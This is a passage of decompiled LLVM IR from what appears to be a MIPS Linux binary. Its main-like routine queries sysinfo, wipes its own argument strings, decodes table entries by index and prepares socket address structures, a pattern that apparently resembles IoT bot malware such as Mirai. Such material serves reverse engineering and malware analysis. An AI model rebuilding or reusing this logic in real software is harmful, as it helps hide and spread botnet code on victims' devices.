dec_label_pc_401e20:                              ; preds = %dec_label_pc_401d9c.dec_label_pc_401e20_crit_edge, %dec_label_pc_401e04
  %v0_401e20 = phi i32 [ %v0_401e20.pre, %dec_label_pc_401d9c.dec_label_pc_401e20_crit_edge ], [ %v1_401e08, %dec_label_pc_401e04 ]
  %v1_401e20 = icmp ult i32 %v0_401e20, 2
  %v2_401e20 = zext i1 %v1_401e20 to i32
  store i32 %v2_401e20, i32* %v0.global-to-local, align 4
  %v1_401e24 = icmp eq i1 %v1_401e20, false
  br i1 %v1_401e24, label %dec_label_pc_401ecc, label %dec_label_pc_401e28

dec_label_pc_401e28:                              ; preds = %dec_label_pc_401e20
  %v0_401e2c = load i32, i32* %gp.global-to-local, align 4
  %v1_401e2c = add i32 %v0_401e2c, -32332
  %v2_401e2c = inttoptr i32 %v1_401e2c to i32*
  %v3_401e2c = load i32, i32* %v2_401e2c, align 4
  call void @__pseudo_call(i32 %v3_401e2c)
  %v0_401e3c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v1_401e48 = icmp ne i32 %v0_401e3c, -1
  %v2_401e48 = zext i1 %v1_401e48 to i32
  store i32 %v2_401e48, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401e4c

dec_label_pc_401e4c:                              ; preds = %dec_label_pc_401df8, %dec_label_pc_401e28
  %v1_401e4c = add i32 %v1_401cd8, 292824
  %v2_401e4c = inttoptr i32 %v1_401e4c to i32*
  %v3_401e4c = load i32, i32* %v2_401e4c, align 4
  call void @__pseudo_call(i32 %v3_401e4c)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v1_401e64 = add i32 %v1_401cd8, 292740
  %v2_401e64 = inttoptr i32 %v1_401e64 to i32*
  %v3_401e64 = load i32, i32* %v2_401e64, align 4
  call void @__pseudo_call(i32 %v3_401e64)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v1_401e7c = add i32 %v1_401cd8, 292284
  %v2_401e7c = inttoptr i32 %v1_401e7c to i32*
  %v3_401e7c = load i32, i32* %v2_401e7c, align 4
  call void @__pseudo_call(i32 %v3_401e7c)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v1_401e94 = add i32 %v1_401cd8, 292764
  %v2_401e94 = inttoptr i32 %v1_401e94 to i32*
  %v3_401e94 = load i32, i32* %v2_401e94, align 4
  call void @__pseudo_call(i32 %v3_401e94)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  %v1_401eac = add i32 %v1_401cd8, 292128
  %v2_401eac = inttoptr i32 %v1_401eac to i32*
  %v3_401eac = load i32, i32* %v2_401eac, align 4
  %v1_401eb4 = add i32 %v3_401eac, 7376
  call void @__pseudo_call(i32 %v1_401eb4)
  store i32 %v2_401cd8, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401ecc

dec_label_pc_401ecc:                              ; preds = %dec_label_pc_401e20, %dec_label_pc_401e4c
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401ed0

dec_label_pc_401ed0:                              ; preds = %dec_label_pc_401e04, %dec_label_pc_401ecc
  store i32 %v0_401ce4, i32* %s3.global-to-local, align 4
  store i32 %v0_401cec, i32* %s1.global-to-local, align 4
  store i32 %v0_401cf0, i32* %s0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_401e08, { 2, 1, 0 }
  uselistorder i32 %v2_401cd8, { 6, 5, 4, 3, 2, 1, 11, 10, 9, 8, 7, 0, 12 }
  uselistorder i32 %v1_401cd8, { 2, 3, 4, 5, 6, 0, 1, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %v3_401c8c, { 1, 0 }
  uselistorder i32 %v2_401c54, { 1, 0, 2 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %s3.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 3, 4, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16 }
  uselistorder i32 13, { 1, 3, 0, 4, 2, 5 }
  uselistorder label %dec_label_pc_401ed0, { 1, 0 }
  uselistorder label %dec_label_pc_401ecc, { 1, 0 }
  uselistorder label %dec_label_pc_401e4c, { 1, 0 }
  uselistorder label %dec_label_pc_401e20, { 1, 0 }
  uselistorder label %dec_label_pc_401d9c, { 1, 0 }
  uselistorder label %dec_label_pc_401cb8, { 1, 0 }
}

define i32 @function_401eec(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_401eec:
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %a1.global-to-local, align 4
  %stack_var_-996 = alloca i32, align 4
  %stack_var_-992 = alloca i32, align 4
  %stack_var_-988 = alloca i32, align 4
  %stack_var_-1000 = alloca i16, align 2
  %stack_var_-980 = alloca i32, align 4
  %stack_var_-548 = alloca i32, align 4
  %stack_var_-676 = alloca i32, align 4
  %stack_var_-804 = alloca i32, align 4
  %stack_var_-964 = alloca i32, align 4
  %stack_var_-900 = alloca i32, align 4
  %stack_var_-932 = alloca i32, align 4
  %stack_var_-868 = alloca i32, align 4
  %v1_401ef4 = load i32, i32* @t9, align 4
  %v2_401ef4 = add i32 %v1_401ef4, 324324
  %v0_401f10 = load i32, i32* @s1, align 4
  %v3_401f1c = load i32, i32* @global_var_449450.166, align 4
  store i32 %v3_401f1c, i32* @t9, align 4
  store i32 %arg1, i32* @s5, align 4
  store i32 %tmp, i32* @s3, align 4
  %v3_401f28 = bitcast i32* %stack_var_-868 to %sysinfo*
  %v4_401f28 = call i32 @function_404f40(%sysinfo* %v3_401f28)
  store i32 %v4_401f28, i32* %v0.global-to-local, align 4
  %v3_401f38 = load i32, i32* @global_var_4493a8.167, align 4
  store i32 %v3_401f38, i32* @t9, align 4
  %v1_401f40 = call i32 @function_4029cc()
  store i32 %v1_401f40, i32* %v0.global-to-local, align 4
  %v3_401f50 = load i32, i32* @global_var_449288.168, align 4
  store i32 %v3_401f50, i32* @t9, align 4
  %v1_401f58 = call i32 @function_401078()
  store i32 2, i32* @v0, align 4
  %v0_401f68 = load i32, i32* @s5, align 4
  %v2_401f68 = icmp eq i32 %v0_401f68, 2
  store i32 1, i32* @s4, align 4
  br i1 %v2_401f68, label %dec_label_pc_401f6c, label %dec_label_pc_401fb8

dec_label_pc_401f6c:                              ; preds = %dec_label_pc_401eec
  %v0_401f70 = load i32, i32* @s3, align 4
  %v1_401f70 = add i32 %v0_401f70, 4
  %v2_401f70 = inttoptr i32 %v1_401f70 to i32*
  %v3_401f70 = load i32, i32* %v2_401f70, align 4
  store i32 %v3_401f70, i32* @s0, align 4
  %v3_401f7c = call i32 @function_404200(i32 %v3_401f70)
  store i32 %v3_401f7c, i32* %v0.global-to-local, align 4
  %v0_401f88 = load i32, i32* @s0, align 4
  store i32 %v3_401f7c, i32* %a1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_4081e0.171 to i32), i32* %a2.global-to-local, align 4
  store i32 1, i32* %a3.global-to-local, align 4
  %v5_401f9c = call i32 @function_404404(i32 %v0_401f88, i32 %v3_401f7c, i32 ptrtoint (i32* @global_var_4081e0.171 to i32), i32 1)
  store i32 %v5_401f9c, i32* %v0.global-to-local, align 4
  store i32 -1, i32* %v1.global-to-local, align 4
  %v2_401fac = icmp eq i32 %v5_401f9c, -1
  %. = zext i1 %v2_401fac to i32
  store i32 %., i32* @s4, align 4
  br label %dec_label_pc_401fb8

dec_label_pc_401fb8:                              ; preds = %dec_label_pc_401f6c, %dec_label_pc_401eec
  %v0_401fb8 = load i32, i32* @s1, align 4
  %v1_401fbc = icmp ult i32 %v0_401fb8, 2097152
  %v2_401fbc = zext i1 %v1_401fbc to i32
  store i32 %v2_401fbc, i32* %v0.global-to-local, align 4
  %v1_401fc0 = icmp eq i1 %v1_401fbc, false
  br i1 %v1_401fc0, label %dec_label_pc_401fcc, label %dec_label_pc_401fc4

dec_label_pc_401fc4:                              ; preds = %dec_label_pc_401fb8
  store i32 0, i32* @s4, align 4
  br label %dec_label_pc_401fcc

dec_label_pc_401fcc:                              ; preds = %dec_label_pc_401fb8, %dec_label_pc_401fc4
  %v3_401fcc = load i32, i32* @global_var_449390.172, align 4
  store i32 %v3_401fcc, i32* @t9, align 4
  %v0_401fd0 = load i32, i32* @s3, align 4
  %v1_401fd0 = inttoptr i32 %v0_401fd0 to i32*
  %v2_401fd0 = load i32, i32* %v1_401fd0, align 4
  %v2_401fd4 = inttoptr i32 %v2_401fd0 to i8*
  %v3_401fd4 = call i32 @function_405000(i8* %v2_401fd4)
  store i32 %v3_401fd4, i32* %v0.global-to-local, align 4
  %v3_401fe4 = load i32, i32* @global_var_4493a0.57, align 4
  store i32 %v3_401fe4, i32* @t9, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  %v3_401fec = call i32 @function_405b00(i32 1, i32 1)
  store i32 %v3_401fec, i32* %v0.global-to-local, align 4
  %v3_401ffc = load i32, i32* @global_var_4493a0.57, align 4
  store i32 %v3_401ffc, i32* @t9, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  %v3_402004 = call i32 @function_405b00(i32 18, i32 1)
  store i32 %v3_402004, i32* %v0.global-to-local, align 4
  %v3_402014 = load i32, i32* @global_var_449344.173, align 4
  store i32 %v3_402014, i32* @t9, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  %v5_402020 = call i32 @function_404cd0(i32 0, i32 0, i32 0, i32 0)
  store i32 %v5_402020, i32* %v0.global-to-local, align 4
  store i32 -1, i32* %v1.global-to-local, align 4
  %v2_402030 = icmp eq i32 %v5_402020, -1
  br i1 %v2_402030, label %dec_label_pc_402034, label %dec_label_pc_4020e4

dec_label_pc_402034:                              ; preds = %dec_label_pc_401fcc
  %v3_402038 = load i32, i32* @global_var_44932c.174, align 4
  store i32 %v3_402038, i32* @t9, align 4
  %v2_402040 = call i32 @function_400c78(i32 28)
  store i32 %v2_402040, i32* %v0.global-to-local, align 4
  %v3_402050 = load i32, i32* @global_var_449480.175, align 4
  store i32 %v3_402050, i32* @t9, align 4
  %v2_402058 = call i32 @function_400f0c(i32 28)
  store i32 %v2_402058, i32* %v0.global-to-local, align 4
  %v3_402068 = load i32, i32* @global_var_449480.175, align 4
  store i32 %v3_402068, i32* @t9, align 4
  store i32 %v2_402058, i32* @s0, align 4
  %v3_402070 = call i32 @function_400f0c(i32 28)
  store i32 %v3_402070, i32* @v0, align 4
  %v3_402088 = call i32 @function_404200(i32 %v3_402070)
  store i32 %v3_402088, i32* %v0.global-to-local, align 4
  %v0_402094 = load i32, i32* @s0, align 4
  store i32 %v0_402094, i32* %a1.global-to-local, align 4
  %v3_402098 = load i32, i32* @global_var_4493e8.176, align 4
  store i32 %v3_402098, i32* @t9, align 4
  store i32 %v3_402088, i32* %a2.global-to-local, align 4
  %v4_4020a0 = inttoptr i32 %v0_402094 to i32*
  %v5_4020a0 = call i32 @function_405060(i32 1, i32* %v4_4020a0, i32 %v3_402088)
  store i32 %v5_4020a0, i32* %v0.global-to-local, align 4
  %v3_4020b4 = load i32, i32* @global_var_4493e8.176, align 4
  store i32 %v3_4020b4, i32* @t9, align 4
  store i32 ptrtoint (i32* @global_var_408248.177 to i32), i32* %a1.global-to-local, align 4
  store i32 1, i32* %a2.global-to-local, align 4
  %v5_4020bc = call i32 @function_405060(i32 1, i32* nonnull @global_var_408248.177, i32 1)
  store i32 %v5_4020bc, i32* %v0.global-to-local, align 4
  %v3_4020cc = load i32, i32* @global_var_449404.178, align 4
  store i32 %v3_4020cc, i32* @t9, align 4
  %v2_4020d4 = call i32 @function_400dc0(i32 28)
  store i32 %v2_4020d4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4020e4

dec_label_pc_4020e4:                              ; preds = %dec_label_pc_401fcc, %dec_label_pc_402034
  %v3_4020e8 = load i32, i32* @global_var_4493c0.179, align 4
  store i32 %v3_4020e8, i32* @t9, align 4
  %v5_4020f0 = call i32 @function_404970(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_408168.180, i32 0, i32 0))
  store i32 %v5_4020f0, i32* %v0.global-to-local, align 4
  %v3_402100 = load i32, i32* @global_var_44948c.181, align 4
  store i32 %v3_402100, i32* @t9, align 4
  %v1_402108 = call i32 @function_4046e8()
  store i32 %v1_402108, i32* %v0.global-to-local, align 4
  %v1_402118 = add i32 %v1_401ef4, 292260
  %v2_402118 = inttoptr i32 %v1_402118 to i32*
  %v3_402118 = load i32, i32* %v2_402118, align 4
  store i32 %v3_402118, i32* %v1.global-to-local, align 4
  %v3_40211c = load i32, i32* @global_var_449380.4, align 4
  store i32 %v3_40211c, i32* @t9, align 4
  %v3_402124 = inttoptr i32 %v3_402118 to i32*
  store i32 %v1_402108, i32* %v3_402124, align 4
  %v4_402124 = call i32 @function_404a30()
  %v1_402130 = icmp sgt i32 %v4_402124, 0
  store i32 0, i32* %v0.global-to-local, align 4
  br i1 %v1_402130, label %dec_label_pc_402898, label %dec_label_pc_402134

dec_label_pc_402134:                              ; preds = %dec_label_pc_4020e4
  %v3_402138 = load i32, i32* @global_var_4492a0.184, align 4
  store i32 %v3_402138, i32* @t9, align 4
  %v1_40213c = add i32 %v1_401ef4, 291852
  %v2_40213c = inttoptr i32 %v1_40213c to i32*
  %v3_40213c = load i32, i32* %v2_40213c, align 4
  store i32 %v3_40213c, i32* @s1, align 4
  %v1_402140 = call i32 @function_404ee0()
  store i32 %v1_402140, i32* %v0.global-to-local, align 4
  %v3_402150 = load i32, i32* @global_var_44928c.150, align 4
  store i32 %v3_402150, i32* @t9, align 4
  %v2_402158 = load i32, i32* @s1, align 4
  %v3_402158 = inttoptr i32 %v2_402158 to i32*
  store i32 %v1_402140, i32* %v3_402158, align 4
  %v5_402158 = call i32 @function_4049d0(i32 0)
  store i32 %v5_402158, i32* %v0.global-to-local, align 4
  %v3_402168 = load i32, i32* @global_var_44928c.150, align 4
  store i32 %v3_402168, i32* @t9, align 4
  %v2_402170 = call i32 @function_4049d0(i32 2)
  store i32 %v2_402170, i32* %v0.global-to-local, align 4
  %v3_402180 = load i32, i32* @global_var_44928c.150, align 4
  store i32 %v3_402180, i32* @t9, align 4
  %v2_402188 = call i32 @function_4049d0(i32 1)
  store i32 %v2_402188, i32* %v0.global-to-local, align 4
  store i32 0, i32* %a3.global-to-local, align 4
  %v3_402198 = load i32, i32* @global_var_449344.173, align 4
  store i32 %v3_402198, i32* @t9, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  %v5_4021a4 = call i32 @function_404cd0(i32 0, i32 0, i32 0, i32 0)
  store i32 %v5_4021a4, i32* %v0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 32, i32* %a2.global-to-local, align 4
  %v8_4021bc = call i32 @function_405520(i32* nonnull %stack_var_-932, i32 0, i32 32)
  store i32 40, i32* %v0.global-to-local, align 4
  %v0_4021c8 = load i32, i32* @s3, align 4
  %v1_4021c8 = inttoptr i32 %v0_4021c8 to i32*
  %v2_4021c8 = load i32, i32* %v1_4021c8, align 4
  store i32 %v2_4021c8, i32* @s0, align 4
  store i32 40, i32* %stack_var_-932, align 4
  store i32 41, i32* @v1, align 4
  store i32 109, i32* @v0, align 4
  store i32 46, i32* %stack_var_-900, align 4
  %v5_40220c = call i32 @function_404200(i32 %v2_4021c8)
  store i32 %v5_40220c, i32* %v0.global-to-local, align 4
  %v0_402218 = load i32, i32* @s0, align 4
  store i32 %v0_402218, i32* %a2.global-to-local, align 4
  store i32 %v5_40220c, i32* %a3.global-to-local, align 4
  %v2_402224 = ptrtoint i32* %stack_var_-900 to i32
  store i32 4, i32* %a1.global-to-local, align 4
  %v5_402228 = call i32 @function_404404(i32 %v2_402224, i32 4, i32 %v0_402218, i32 %v5_40220c)
  %v1_402230 = add i32 %v5_402228, 1
  store i32 %v1_402230, i32* @v0, align 4
  %v1_402238 = icmp eq i32 %v1_402230, 0
  br i1 %v1_402238, label %dec_label_pc_402240, label %dec_label_pc_40226c

dec_label_pc_402240:                              ; preds = %dec_label_pc_402134, %dec_label_pc_40226c
  %v0_402240 = load i32, i32* @s1, align 4
  %v1_402240 = inttoptr i32 %v0_402240 to i32*
  %v2_402240 = load i32, i32* %v1_402240, align 4
  %v3_402244 = load i32, i32* @global_var_4493e4.7, align 4
  store i32 %v3_402244, i32* @t9, align 4
  %v1_402248 = sub i32 0, %v2_402240
  store i32 9, i32* %a1.global-to-local, align 4
  %v3_40224c = call i32 @function_404b50(i32 %v1_402248, i32 9)
  store i32 %v3_40224c, i32* @v0, align 4
  %v3_40225c = load i32, i32* @global_var_4492dc.8, align 4
  store i32 %v3_40225c, i32* @t9, align 4
  %v2_402264 = call i32 @function_406350(i32 0)
  store i32 %v2_402264, i32* @v0, align 4
  br label %dec_label_pc_40226c

dec_label_pc_40226c:                              ; preds = %dec_label_pc_402134, %dec_label_pc_402240
  %v3_40226c = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_402274 = add i32 %v3_40226c, 7376
  store i32 ptrtoint (i32* @global_var_402280.188 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v1_402274)
  %v0_402284 = load i32, i32* @v0, align 4
  %v1_402284 = icmp eq i32 %v0_402284, 0
  store i32 0, i32* @s2, align 4
  br i1 %v1_402284, label %dec_label_pc_402240, label %dec_label_pc_402288

dec_label_pc_402288:                              ; preds = %dec_label_pc_40226c
  %v0_402290 = load i32, i32* @s3, align 4
  store i32 %v0_402290, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_402294

dec_label_pc_402294:                              ; preds = %dec_label_pc_402294, %dec_label_pc_402288
  %v0_402294 = phi i32 [ %v3_4022cc, %dec_label_pc_402294 ], [ %v0_402290, %dec_label_pc_402288 ]
  %v1_402294 = add i32 %v0_402294, -4
  %v2_402294 = inttoptr i32 %v1_402294 to i32*
  %v3_402294 = load i32, i32* %v2_402294, align 4
  %v3_4022a0 = call i32 @function_404200(i32 %v3_402294)
  store i32 %v3_4022a0, i32* %v0.global-to-local, align 4
  store i32 %v3_402294, i32* @a0, align 4
  store i32 %v3_4022a0, i32* @a2, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v4_4022b8 = call i32 @function_4042e8(i32 %v3_402294, i32 0, i32 %v3_4022a0)
  %v0_4022c4 = load i32, i32* @s2, align 4
  %v1_4022c4 = add i32 %v0_4022c4, 1
  store i32 %v1_4022c4, i32* @s2, align 4
  %v1_4022c8 = load i32, i32* @s5, align 4
  %v2_4022c8 = icmp slt i32 %v1_4022c4, %v1_4022c8
  %v3_4022c8 = zext i1 %v2_4022c8 to i32
  store i32 %v3_4022c8, i32* @v0, align 4
  %v2_4022cc = load i32, i32* %s1.global-to-local, align 4
  %v3_4022cc = add i32 %v2_4022cc, 4
  store i32 %v3_4022cc, i32* %s1.global-to-local, align 4
  br i1 %v2_4022c8, label %dec_label_pc_402294, label %dec_label_pc_4022d0

dec_label_pc_4022d0:                              ; preds = %dec_label_pc_402294
  %v3_4022d4 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_4022d4, i32* @t9, align 4
  %v3_4022dc = ptrtoint i32* %stack_var_-964 to i32
  store i32 %v3_4022dc, i32* @s1, align 4
  %v4_4022dc = call i32 @function_4028bc()
  store i32 %v4_4022dc, i32* %v0.global-to-local, align 4
  %v1_4022e4 = mul i32 %v4_4022dc, 4
  %v1_4022ec = and i32 %v1_4022e4, 12
  %v3_4022f0 = load i32, i32* @global_var_44940c.191, align 4
  store i32 %v3_4022f0, i32* @t9, align 4
  %v1_4022f4 = add nuw nsw i32 %v1_4022ec, 12
  store i32 %v1_4022f4, i32* @s0, align 4
  store i32 %v1_4022f4, i32* %a1.global-to-local, align 4
  %v4_4022fc = bitcast i32* %stack_var_-964 to i8*
  %v5_4022fc = call i32 @function_402918(i8* %v4_4022fc, i32 %v1_4022f4)
  %v0_402308 = load i32, i32* @sp, align 4
  %v1_402308 = load i32, i32* @s0, align 4
  %v2_402308 = add i32 %v1_402308, %v0_402308
  store i32 %v2_402308, i32* %v0.global-to-local, align 4
  %v3_40230c = load i32, i32* @global_var_449468.192, align 4
  store i32 %v3_40230c, i32* @t9, align 4
  store i32 %v3_4022dc, i32* %a1.global-to-local, align 4
  %v2_402318 = add i32 %v2_402308, 68
  %v3_402318 = inttoptr i32 %v2_402318 to i8*
  store i8 0, i8* %v3_402318, align 1
  %v6_402318 = call i32 @function_404c50(i32 15, i32 %v3_4022dc)
  store i32 %v6_402318, i32* %v0.global-to-local, align 4
  %v0_402324 = load i32, i32* @s3, align 4
  %v1_402324 = inttoptr i32 %v0_402324 to i32*
  %v2_402324 = load i32, i32* %v1_402324, align 4
  %v3_40232c = load i32, i32* @global_var_4492ec.193, align 4
  store i32 %v3_40232c, i32* @t9, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_40824c.194 to i32), i32* %a1.global-to-local, align 4
  %v7_402334 = inttoptr i32 %v2_402324 to i8*
  %v8_402334 = call i32 @function_404284(i8* %v7_402334, i32 ptrtoint ([4 x i8]* @global_var_40824c.194 to i32))
  store i32 %v8_402334, i32* %v0.global-to-local, align 4
  %v0_402340 = load i32, i32* @s4, align 4
  %v1_402340 = icmp eq i32 %v0_402340, 0
  br i1 %v1_402340, label %dec_label_pc_402360, label %dec_label_pc_402344

dec_label_pc_402344:                              ; preds = %dec_label_pc_4022d0
  %v3_402348 = load i32, i32* @global_var_449428.195, align 4
  store i32 %v3_402348, i32* @t9, align 4
  %v2_402350 = call i32 @function_40315c(i32 1)
  store i32 %v2_402350, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402360

dec_label_pc_402360:                              ; preds = %dec_label_pc_4022d0, %dec_label_pc_402344
  %v3_402360 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_402360, i32* @v0, align 4
  %v3_402364 = load i32, i32* @global_var_449300.51, align 4
  store i32 %v3_402364, i32* @t9, align 4
  %v3_402368 = load i32, i32* @global_var_449024.196, align 4
  store i32 0, i32* @s5, align 4
  %v2_40236c = call i32 @function_403fe8(i32 %v3_402368)
  store i32 %v2_40236c, i32* %v0.global-to-local, align 4
  %v3_40237c = load i32, i32* @global_var_4493fc.197, align 4
  store i32 %v3_40237c, i32* @t9, align 4
  %v1_402384 = call i32 @function_400960()
  store i32 %v1_402384, i32* %v0.global-to-local, align 4
  store i32 %v2_401ef4, i32* @gp, align 4
  %v2_40239c = ptrtoint i32* %stack_var_-804 to i32
  %v2_4023a0 = ptrtoint i32* %stack_var_-676 to i32
  %v2_4023b4 = ptrtoint i32* %stack_var_-548 to i32
  %v2_402528 = ptrtoint i32* %stack_var_-980 to i32
  %v4_40252c = bitcast i32* %stack_var_-980 to %sockaddr*
  %v4_40254c = ptrtoint i16* %stack_var_-1000 to i32
  %v2_4025e0 = ptrtoint i32* %stack_var_-988 to i32
  %v4_4026a8 = ptrtoint i32* %stack_var_-992 to i32
  %v3_4026c0 = ptrtoint i32* %stack_var_-996 to i32
  %v6_402774 = bitcast i16* %stack_var_-1000 to i32*
  %v1_402708 = add i32 %v1_401ef4, 291580
  %v2_402708 = inttoptr i32 %v1_402708 to i32*
  %v1_402748 = add i32 %v1_401ef4, 291828
  %v2_402748 = inttoptr i32 %v1_402748 to i32*
  br label %dec_label_pc_402390

dec_label_pc_402390:                              ; preds = %dec_label_pc_4027f0, %dec_label_pc_402738, %dec_label_pc_402360
  store i32 4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402394

dec_label_pc_402394:                              ; preds = %dec_label_pc_402834, %dec_label_pc_402834, %dec_label_pc_4025f8, %dec_label_pc_402708, %dec_label_pc_4026d4, %dec_label_pc_402658, %dec_label_pc_402390
  store i32 4, i32* %stack_var_-992, align 4
  store i32 0, i32* %stack_var_-996, align 4
  store i32 %v2_40239c, i32* %v0.global-to-local, align 4
  store i32 %v2_4023a0, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4023a4

dec_label_pc_4023a4:                              ; preds = %dec_label_pc_4023a4, %dec_label_pc_402394
  %v0_4023a4 = phi i32 [ %v1_4023a8, %dec_label_pc_4023a4 ], [ %v2_40239c, %dec_label_pc_402394 ]
  %v1_4023a4 = inttoptr i32 %v0_4023a4 to i32*
  store i32 0, i32* %v1_4023a4, align 4
  %v0_4023a8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4023a8 = add i32 %v0_4023a8, 4
  store i32 %v1_4023a8, i32* %v0.global-to-local, align 4
  %v1_4023ac = load i32, i32* %v1.global-to-local, align 4
  %v2_4023ac = icmp eq i32 %v1_4023a8, %v1_4023ac
  br i1 %v2_4023ac, label %dec_label_pc_4023b0, label %dec_label_pc_4023a4

dec_label_pc_4023b0:                              ; preds = %dec_label_pc_4023a4
  store i32 %v2_4023b4, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_4023b8

dec_label_pc_4023b8:                              ; preds = %dec_label_pc_4023b8, %dec_label_pc_4023b0
  %v0_4023b8 = phi i32 [ %v1_4023bc, %dec_label_pc_4023b8 ], [ %v1_4023a8, %dec_label_pc_4023b0 ]
  %v1_4023b8 = inttoptr i32 %v0_4023b8 to i32*
  store i32 0, i32* %v1_4023b8, align 4
  %v0_4023bc = load i32, i32* %v0.global-to-local, align 4
  %v1_4023bc = add i32 %v0_4023bc, 4
  store i32 %v1_4023bc, i32* %v0.global-to-local, align 4
  %v1_4023c0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4023c0 = icmp eq i32 %v1_4023bc, %v1_4023c0
  br i1 %v2_4023c0, label %dec_label_pc_4023c4, label %dec_label_pc_4023b8

dec_label_pc_4023c4:                              ; preds = %dec_label_pc_4023b8
  %v0_4023c8 = load i32, i32* @gp, align 4
  %v1_4023c8 = add i32 %v0_4023c8, -32744
  %v2_4023c8 = inttoptr i32 %v1_4023c8 to i32*
  %v3_4023c8 = load i32, i32* %v2_4023c8, align 4
  store i32 %v3_4023c8, i32* @s2, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v1_4023d0 = add i32 %v3_4023c8, -28632
  %v2_4023d0 = inttoptr i32 %v1_4023d0 to i32*
  %v3_4023d0 = load i32, i32* %v2_4023d0, align 4
  store i32 %v3_4023d0, i32* @s1, align 4
  %v2_4023d8 = icmp eq i32 %v3_4023d0, -1
  br i1 %v2_4023d8, label %dec_label_pc_4023dc, label %dec_label_pc_40253c

dec_label_pc_4023dc:                              ; preds = %dec_label_pc_4023c4
  %v1_4023e0 = add i32 %v0_4023c8, -32420
  %v2_4023e0 = inttoptr i32 %v1_4023e0 to i32*
  %v3_4023e0 = load i32, i32* %v2_4023e0, align 4
  store i32 ptrtoint (i32* @global_var_4023f0.198 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v3_4023e0)
  %v3_4023f8 = load i32, i32* @global_var_449480.175, align 4
  store i32 %v3_4023f8, i32* @t9, align 4
  %v2_402400 = call i32 @function_400f0c(i32 26)
  store i32 %v2_402400, i32* @v0, align 4
  %v3_402410 = load i32, i32* @global_var_4493d4.199, align 4
  store i32 %v3_402410, i32* @t9, align 4
  %v3_402414 = load i32, i32* @global_var_4491e8.9, align 4
  store i32 %v3_402414, i32* @s0, align 4
  store i32 16, i32* %a1.global-to-local, align 4
  %v3_402418 = call i32 @function_402a7c(i32 %v2_402400, i32 16)
  store i32 %v3_402418, i32* %v0.global-to-local, align 4
  %v3_402428 = load i32, i32* @global_var_449404.178, align 4
  store i32 %v3_402428, i32* @t9, align 4
  %v1_40242c = icmp eq i32 %v3_402418, 0
  store i32 %v3_402418, i32* @global_var_449518.152, align 4
  br i1 %v1_40242c, label %dec_label_pc_402430, label %dec_label_pc_402450

dec_label_pc_402430:                              ; preds = %dec_label_pc_4023dc
  %v2_402434 = call i32 @function_400dc0(i32 26)
  store i32 %v2_402434, i32* %v0.global-to-local, align 4
  %v3_402444 = load i32, i32* @global_var_449284.12, align 4
  br label %dec_label_pc_402450

dec_label_pc_402450:                              ; preds = %dec_label_pc_4023dc, %dec_label_pc_402430
  %v0_402450 = phi i32 [ %v3_402428, %dec_label_pc_4023dc ], [ %v3_402444, %dec_label_pc_402430 ]
  store i32 ptrtoint (i32* @global_var_402458.200 to i32), i32* @ra, align 4
  call void @__pseudo_call(i32 %v0_402450)
  %v3_402458 = load i32, i32* @global_var_449518.152, align 4
  %v1_402460 = add i32 %v3_402458, 261
  %v2_402460 = inttoptr i32 %v1_402460 to i8*
  %v3_402460 = load i8, i8* %v2_402460, align 1
  %v4_402460 = zext i8 %v3_402460 to i32
  %v1_402468 = add nuw nsw i32 %v4_402460, 254
  %v1_40246c = and i32 %v1_402468, 254
  %v1_402470 = icmp ult i32 %v1_40246c, 14
  %v2_402470 = zext i1 %v1_402470 to i32
  store i32 %v2_402470, i32* %v0.global-to-local, align 4
  store i32 2, i32* %a1.global-to-local, align 4
  br i1 %v1_402470, label %dec_label_pc_4024ac, label %dec_label_pc_402478

dec_label_pc_402478:                              ; preds = %dec_label_pc_402450
  %v3_40247c = load i32, i32* @global_var_449284.12, align 4
  store i32 %v3_40247c, i32* @t9, align 4
  %v2_402484 = call i32 @function_405f40(i32 %v3_402458)
  store i32 %v2_402484, i32* @v0, align 4
